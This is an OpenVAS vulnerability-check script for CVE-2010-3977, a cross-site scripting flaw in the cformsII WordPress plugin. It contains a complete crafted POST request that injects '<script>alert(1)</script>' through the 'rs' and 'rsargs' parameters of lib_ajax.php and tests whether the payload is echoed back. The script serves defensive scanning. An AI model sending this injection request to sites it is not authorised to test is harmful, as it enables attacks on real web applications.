###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_mult_html_injection_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# WordPress Plugin cformsII 'lib_ajax.php' Multiple HTML Injection Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary code in
  the context of the application.
  Impact Level: Application";
tag_affected = "WordPress plugin cforms Version 11.7 and earlier.";
tag_insight = "The flaws are caused by improper validation of user-supplied input passed via
  the 'rs' and 'rsargs' parameters to wp-content/plugins/cforms/lib_ajax.php,
  which allows attackers to execute arbitrary HTML and script code on the web
  server.";
tag_solution = "No solution or patch is available as of 12th November, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.deliciousdays.com/cforms-plugin/";
tag_summary = "This host is running cformsII WordPress Plugin and is prone to
  multiple HTML injection vulnerabilities.";

if(description)
{
  script_id(801628);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)");
  script_bugtraq_id(44587);
  script_cve_id("CVE-2010-3977");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("WordPress Plugin cformsII 'lib_ajax.php' Multiple HTML Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42006");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/62938");
  script_xref(name : "URL" , value : "http://www.conviso.com.br/security-advisory-cform-wordpress-plugin-v-11-cve-2010-3977/");

  script_description(desc);
  script_summary("Check if WordPress plugin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/wordpress", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if("Powered by WordPress" >< res)
  {
    ## Construct POST attack request
    req = string("POST ",dir,"/wp-content/plugins/cforms/lib_ajax.php HTTP/1.1\r\n",
                 "Host: ",get_host_ip(),"\r\n",
                 "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
                 "Content-Length: 92\r\n\r\n",
                 "rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#",
                 "$<script>alert(1)</script>\r\n");
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(('<script>alert(1)</script>' >< res) &&
        egrep(pattern:"^HTTP/.* 200 OK", string:res))
    {
      security_warning(port);
      exit(0);
    }
  }
}
